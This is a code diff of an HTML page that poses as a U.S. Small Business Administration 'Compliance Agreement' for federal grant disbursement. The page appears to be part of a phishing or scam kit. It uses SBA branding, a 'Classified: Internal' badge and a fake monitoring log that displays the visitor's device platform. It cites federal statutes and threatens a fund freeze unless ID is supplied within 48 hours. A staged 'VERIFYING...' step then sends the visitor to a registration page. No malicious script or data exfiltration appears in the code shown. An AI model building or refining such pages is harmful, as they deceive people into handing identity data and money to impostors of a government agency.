@@ -5,154 +5,111 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SBA Portal | Terms & Compliance</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-navy: #001a3d; }
-        body { 
-            font-family: 'Public Sans', sans-serif; 
-            background-color: #f8fafc;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .gov-top { background: #f0f0f0; color: #444; font-size: 10px; padding: 6px 20px; border-bottom: 1px solid #ddd; font-weight: 700; }
-        .sba-header { background: white; border-bottom: 4px solid var(--sba-red); box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; }
         
-        .sba-logo-box {
-            border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue);
-            border-right: 3px solid var(--sba-blue); border-bottom: 3px solid var(--sba-red);
-            padding: 2px 6px; display: inline-block; line-height: 1;
-        }
+        .gov-top { background: #000; color: #fff; font-size: 8px; padding: 8px; text-align: center; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; border-bottom: 3px solid #b69121; }
+        .sba-logo-box { border: 2px solid var(--sba-blue); padding: 2px 6px; display: inline-block; line-height: 1; }
 
-        .terms-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); }
-        .terms-text { height: 300px; overflow-y: auto; padding-right: 12px; }
-        .terms-text::-webkit-scrollbar { width: 4px; }
-        .terms-text::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        .terms-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1); }
+        .terms-text { height: 280px; overflow-y: auto; scrollbar-width: thin; }
 
-        .section-h { color: var(--sba-blue); font-weight: 900; margin-top: 24px; border-bottom: 1px solid #e2e8f0; padding-bottom: 6px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .section-h { color: var(--sba-blue); font-weight: 900; margin-top: 20px; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px; font-size: 11px; text-transform: uppercase; }
         
-        /* Custom Checkbox */
-        .checkbox-container {
-            display: flex; align-items: flex-start; gap: 12px; margin-top: 24px;
-            padding: 16px; background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 4px; cursor: pointer;
-        }
-        #agreeCheck { width: 20px; height: 20px; accent-color: var(--sba-blue); flex-shrink: 0; margin-top: 2px; }
-
         .sig-log { 
-            background: #020617; border: 1px solid #1e293b; border-radius: 4px; 
-            padding: 15px; margin-top: 24px; font-family: 'Courier New', monospace; font-size: 10px; color: #22c55e;
-            line-height: 1.5; box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
+            background: #020617; border-radius: 4px; padding: 15px; margin-top: 20px; 
+            font-family: 'Courier New', monospace; font-size: 10px; color: #22c55e;
+            line-height: 1.5; border: 1px solid #1e293b;
         }
 
-        .btn-sba { background-color: var(--sba-blue); border-bottom: 4px solid #001a3d; transition: all 0.2s; }
-        .btn-sba:active { transform: translateY(2px); border-bottom-width: 0; }
+        .btn-sba { background-color: var(--sba-blue); transition: 0.2s; }
+        .btn-sba:disabled { opacity: 0.5; cursor: not-allowed; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col pb-10">
+<body class="min-h-screen flex flex-col">
 
-    <div class="gov-top flex items-center justify-between uppercase tracking-tight">
-        <div class="flex items-center gap-2">
-            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4" alt="US Flag">
-            <span>Federal Compliance Document - FY2026</span>
-        </div>
-        <span class="opacity-60 text-[9px]">ID: SBA-TC-2026</span>
+    <div class="gov-top">
+        <i class="fas fa-shield-alt mr-2"></i> Federal Compliance Node: SBA-TC-2026-X
     </div>
 
-    <header class="sba-header py-4 px-6 flex justify-center">
-        <div class="flex items-center gap-3">
-            <div class="sba-logo-box">
-                <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
-            </div>
-            <div class="text-left">
-                <p class="text-[8px] font-black text-slate-400 uppercase leading-none mb-0.5">U.S. Small Business</p>
-                <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
-            </div>
-        </div>
-    </header>
-
-    <main class="flex-grow flex items-center justify-center p-5">
+    <main class="flex-grow flex items-center justify-center p-6">
         <div class="w-full max-w-2xl">
-            <div class="bg-white terms-card shadow-2xl p-6 md:p-10 border border-gray-200">
+            <div class="bg-white terms-card p-8 md:p-12 border border-slate-200">
                 
-                <div class="flex justify-between items-center mb-8">
-                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Compliance Terms</h2>
-                    <span class="bg-red-100 text-red-700 px-3 py-1 rounded text-[9px] font-black border border-red-200">SECURE V.4.0</span>
+                <div class="flex justify-between items-start mb-8">
+                    <div class="flex items-center gap-3">
+                        <div class="sba-logo-box"><span class="text-xl font-black text-[#002e6d]">SBA</span></div>
+                        <div class="hidden sm:block">
+                            <p class="text-[7px] font-black text-slate-400 uppercase leading-none">U.S. Small Business</p>
+                            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+                        </div>
+                    </div>
+                    <span class="bg-red-100 text-red-700 px-3 py-1 rounded text-[9px] font-black border border-red-200 uppercase">Classified: Internal</span>
                 </div>
 
-                <div class="terms-text text-sm text-slate-600 leading-relaxed">
-                    <div class="section-h">1.0 AUTHORIZATION & DISCLOSURE</div>
-                    <p class="mt-2">By accessing this portal, the applicant provides express consent to the <b>Small Business Administration (SBA)</b> to perform cross-agency data validation. This includes verification of PII with the <b>IRS</b> and <b>DHS</b>.</p>
+                <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter mb-4">Compliance Agreement</h2>
 
-                    <div class="section-h">2.5 DISBURSEMENT PROTOCOLS</div>
-                    <p class="mt-2">Funding is subject to final manual review by an SBA Case Officer. Approved funds are disbursed via <b>ACH/Wire Transfer</b> only to verified financial accounts in the applicant's legal name.</p>
+                <div class="terms-text text-[13px] text-slate-600 leading-relaxed pr-4">
+                    <div class="section-h">1.0 AUTHORIZATION</div>
+                    <p class="mt-2">The applicant provides express consent to the <b>SBA</b> to perform cross-agency data validation, including IRS and DHS records, to confirm eligibility for federal grant disbursement.</p>
 
-                    <div class="section-h">4.0 DATA SOVEREIGNTY</div>
-                    <p class="mt-2">User data is protected under <b>FIPS 140-2</b> compliance standards. All personally identifiable information (PII) is encrypted using 256-bit AES protocols and stored in secure federal nodes.</p>
+                    <div class="section-h">2.0 FRAUDULENT ACTIVITY</div>
+                    <p class="mt-2">Any attempt to bypass security protocols or provide falsified PII is a federal offense under <b>18 U.S.C. § 1030</b>. All access logs are recorded and mapped to IP hardware.</p>
 
-                    <div class="section-h">7.2 FRAUD & PENALTIES</div>
-                    <p class="mt-2">Any attempt to provide fraudulent information is a federal offense. Violations result in immediate account termination and referral to the <b>OIG</b> for prosecution under <b>18 U.S.C. § 1001</b>.</p>
+                    <div class="section-h">3.0 DISBURSEMENT</div>
+                    <p class="mt-2">Funds are held in federal escrow until <b>KYC (Know Your Customer)</b> verification is completed. Failure to provide valid identification within 48 hours results in a temporary freeze.</p>
                 </div>
 
-                <label class="checkbox-container" for="agreeCheck">
-                    <input type="checkbox" id="agreeCheck">
-                    <span class="text-[11px] text-slate-700 font-bold leading-tight uppercase italic">
-                        I acknowledge that I have read the Federal Compliance Document and understand that all activities on this portal are monitored.
+                <div class="mt-6 p-4 bg-slate-50 border border-slate-200 rounded flex gap-4 cursor-pointer" onclick="document.getElementById('agreeCheck').click()">
+                    <input type="checkbox" id="agreeCheck" class="w-5 h-5 mt-0.5 accent-[#002e6d]">
+                    <span class="text-[11px] font-bold text-slate-700 uppercase italic">
+                        I hereby acknowledge the federal compliance standards and verify that I am the authorized legal representative for this claim.
                     </span>
-                </label>
+                </div>
 
                 <div class="sig-log">
-                    [SYSTEM_LOG_INITIALIZED]<br>
-                    REF_ID: SBA-TRUST-V4.<span id="randomId">992</span><br>
-                    USER_AGENT: <span id="userAgent" class="text-blue-400">DEVICE_SYNCED</span><br>
-                    STATUS: <span class="animate-pulse">MONITOR_ACTIVE</span><br>
-                    TIMESTAMP: <span id="currentTimestamp" class="text-yellow-500"></span>
+                    [SYSTEM_LINK_ACTIVE]<br>
+                    USER_NODE: <span id="userAgent" class="text-blue-400">LOADING...</span><br>
+                    ENCRYPTION: AES-256-GCM<br>
+                    TIMESTAMP: <span id="currentTimestamp" class="text-yellow-500">...</span>
                 </div>
 
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
-                    <button onclick="handleAgree()" id="agreeBtn" class="btn-sba text-white font-black py-4 rounded-sm shadow-lg uppercase tracking-widest text-xs">
+                    <button onclick="handleAgree()" id="agreeBtn" class="btn-sba text-white font-black py-4 rounded uppercase tracking-widest text-xs shadow-lg">
                         Accept & Continue
                     </button>
-                    <button onclick="window.location.href='index.html'" class="border-2 border-slate-200 text-slate-400 font-black py-4 rounded-sm uppercase tracking-widest text-xs hover:bg-slate-50">
-                        Cancel Application
+                    <button onclick="window.location.href='index.html'" class="border-2 border-slate-200 text-slate-400 font-black py-4 rounded uppercase tracking-widest text-xs">
+                        Decline
                     </button>
                 </div>
             </div>
-
-            <p class="mt-6 text-center text-[10px] text-slate-400 font-bold uppercase tracking-widest">
-                Official Document of the U.S. Small Business Administration<br>
-                409 3rd St, SW, Washington, DC 20416
-            </p>
         </div>
     </main>
 
     <script>
-        function updateDetails() {
-            const now = new Date();
-            const formatted = now.toISOString().split('T')[0] + ' ' + now.toTimeString().split(' ')[0];
-            document.getElementById('currentTimestamp').innerText = formatted;
-            
-            const ua = navigator.userAgent.split(')')[0].split('(')[1] || "SECURE_NODE";
-            document.getElementById('userAgent').innerText = ua;
-
-            document.getElementById('randomId').innerText = Math.floor(100 + Math.random() * 900);
-        }
+        // System Log Setup
+        const now = new Date();
+        document.getElementById('currentTimestamp').innerText = now.toISOString().replace('T', ' ').split('.')[0];
+        document.getElementById('userAgent').innerText = navigator.platform || "SECURE_DEVICE";
 
         function handleAgree() {
             const isChecked = document.getElementById('agreeCheck').checked;
             if (!isChecked) {
-                alert("FEDERAL REQUIREMENT: You must acknowledge the terms to proceed.");
+                alert("FEDERAL REQUIREMENT: You must acknowledge the compliance terms.");
                 return;
             }
             
             const btn = document.getElementById('agreeBtn');
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHENTICATING...';
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> VERIFYING...';
             btn.disabled = true;
 
             setTimeout(() => {
                 window.location.href = 'register.html';
-            }, 1200);
+            }, 1000);
         }
-
-        updateDetails();
     </script>
 </body>
 </html>
